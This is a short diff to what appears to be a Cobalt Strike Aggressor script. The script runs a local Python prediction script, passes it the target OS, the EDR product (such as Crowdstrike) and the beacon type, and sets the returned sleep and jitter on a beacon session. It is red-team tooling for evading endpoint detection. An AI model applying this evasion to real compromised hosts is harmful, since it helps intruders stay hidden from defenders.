@@ -2,23 +2,27 @@ sub generateSleep {
     $bid = $3['bid'];
     $OS = $3['OS'];
     $EDR = $3['EDR'];
-    $cmd = "py.exe F:\\ai-cobalt\\bof\\prediction.py " . $OS . " " . $EDR;
+    $TYPE = $3['TYPE'];
+
+    $cmd = "py.exe F:\\rt-artifacts\\AI-BOF\\bof\\prediction.py " . $OS . " " . $EDR . " " . $TYPE;
     $out = exec($cmd);
     $data = readAll($out);
+    println($data);
     ($sleep, $jitter) = split(" ", $data);
     # Further split to extract numeric values
     $jitter = split("[^0-9]+", $jitter)[0];
     $sleep = split("[^0-9]+", $sleep)[1];
-    
+    println($sleep);
+    println($jitter);
     bsleep($bid, $sleep, $jitter);
 }
 
 sub aiSleep {
-    $dialog = dialog("AISleep", %(bid => "Session: ", payload_type => "Payload Type: ", EDR => "Crowdstrike", OS => "10"), &generateSleep);
-    dialog_description($dialog, "Generates a packed powershell payload.\n Author Unknow101");
+    $dialog = dialog("AISleep", %(bid => "Session: ", payload_type => "Payload Type: ", EDR => "Crowdstrike", OS => "10", TYPE => "HTTPS"), &generateSleep);
     drow_beacon($dialog, "bid", "Session: ");
     drow_text($dialog, "OS", "OS : ");
     drow_text($dialog, "EDR", "EDR : ");
+    drow_text($dialog, "TYPE", "Beacon Type : ");
     dbutton_action($dialog, "Generate");
     dialog_show($dialog);
 }
